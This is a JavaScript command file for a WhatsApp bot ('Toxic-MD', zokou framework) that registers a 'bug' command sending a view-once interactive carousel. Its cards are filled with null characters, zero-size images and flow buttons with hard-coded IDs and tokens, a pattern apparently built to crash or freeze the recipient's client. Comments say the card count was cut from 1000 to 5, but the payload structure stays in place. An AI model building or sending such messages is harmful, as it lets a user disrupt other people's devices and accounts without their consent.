const { zokou } = require("../framework/zokou");

zokou(
  {
    nomCom: "bug",
    categorie: "Fun",
    reaction: "🎠",
  },
  async (dest, zk, commandeOptions) => {
    const { ms, repondre } = commandeOptions;

    try {
      // Notify the user that the carousel is being prepared
      repondre("𝗣𝗿𝗲𝗽𝗮𝗿𝗶𝗻𝗴 𝘆𝗼𝘂𝗿 𝗰𝗮𝗿𝗼𝘂𝘀𝗲𝗹… 𝗣𝗹𝗲𝗮𝘀𝗲 𝘄𝗮𝗶𝘁! 🎠");

      // Limit the number of cards for performance (1000 cards is excessive and may cause issues)
      const maxCards = 5; // Reduced from 1000 to 5 for practicality
      const maxButtons = 3; // Reduced from 5 to 3 to fit WhatsApp's button limits

      // Prepare buttons for each card
      let buttons = [];
      for (let i = 0; i < maxButtons; i++) {
        buttons.push({
          name: "galaxy_message",
          buttonParamsJson: JSON.stringify({
            header: "null",
            body: "xxx",
            flow_action: "navigate",
            flow_action_payload: { screen: "FORM_SCREEN" },
            flow_cta: "Grattler",
            flow_id: "1169834181134583",
            flow_message_version: "3",
            flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s",
          }),
        });
      }

      // Prepare carousel cards
      let cards = [];
      for (let i = 0; i < maxCards; i++) {
        cards.push({
          body: {
            text: `\u0000\u0000\u0000\u0000\u0000`, // Null characters (kept as in original)
          },
          footer: {
            text: "𝐓𝐨𝐱𝐢𝐜-𝐌𝐃 𝐛𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧",
          },
          header: {
            title: '🍀 𝗧𝗼𝘅𝗶𝗰-𝗠𝗗 𝗖𝗮𝗿𝗼𝘂𝘀𝗲𝗹 \u0000\u0000\u0000\u0000',
            hasMediaAttachment: true,
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              fileSha256: "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
              fileLength: "591",
              height: 0,
              width: 0,
              mediaKey: "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
              fileEncSha256: "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
              directPath: "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
              mediaKeyTimestamp: "1721344123",
              jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECECFBMTJRUv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",
              scansSidecar: "igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==",
              scanLengths: [247, 201, 73, 63],
              midQualityFileSha256: "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro=",
            },
          },
          nativeFlowMessage: {
            buttons: buttons,
          },
        });
      }

      // Create the carousel message
      const carouselMessage = {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2,
            },
            interactiveMessage: {
              body: {
                text: '\u0000\u0000\u0000\u0000',
              },
              footer: {
                text: "𝐓𝐨𝐱𝐢𝐜-𝐌𝐃 𝐛𝐲 𝐱𝐡_𝐜𝐥𝐢𝐧𝐭𝐨𝐧",
              },
              header: {
                hasMediaAttachment: false,
              },
              carouselMessage: {
                cards: cards,
              },
            },
          },
        },
      };

      // Send the carousel message
      await zk.sendMessage(dest, carouselMessage, { quoted: ms });

      // Notify the user that the carousel was sent
      repondre("𝗖𝗮𝗿𝗼𝘂𝘀𝗲𝗹 𝘀𝗲𝗻𝘁! 𝗖𝗵𝗲𝗰𝗸 𝗶𝘁 𝗼𝘂𝘁 🎉");

    } catch (error) {
      console.error("Error in .carousel command:", error);
      repondre("𝗢𝗼𝗽𝘀, 𝘀𝗼𝗺𝗲𝘁𝗵𝗶𝗻𝗴 𝘄𝗲𝗻𝘁 𝘄𝗿𝗼𝗻𝗴 𝘄𝗵𝗶𝗹𝗲 𝘀𝗲𝗻𝗱𝗶𝗻�_g 𝘁𝗵𝗲 𝗰𝗮𝗿𝗼𝘂𝘀𝗲𝗹: " + error.message);
    }
  }
);